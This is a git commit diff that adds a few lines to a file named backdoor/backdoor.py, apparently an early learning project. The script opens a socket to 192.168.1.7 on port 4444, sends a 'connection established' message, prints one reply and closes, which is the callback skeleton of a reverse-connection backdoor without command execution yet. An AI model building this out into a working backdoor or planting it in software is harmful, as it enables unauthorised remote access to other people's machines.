3ed282a4d0e09d7814e689c30731946d3b794be3
Akshaythulasidharan <akshaythulasidharan@gmail.com>
2020-04-12 02:49:05 -0700

    simple socket

--- backdoor/backdoor.py
+++ backdoor/backdoor.py
@@ -3,3 +3,11 @@ import socket
 
 connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 connection.connect(("192.168.1.7",4444))
+
+msg = "\n[+]connection established\n"
+connection.send(msg.encode('ascii'))
+recieved_data = connection.recv(1024)
+print(recieved_data.decode('ascii'))
+
+
+connection.close()
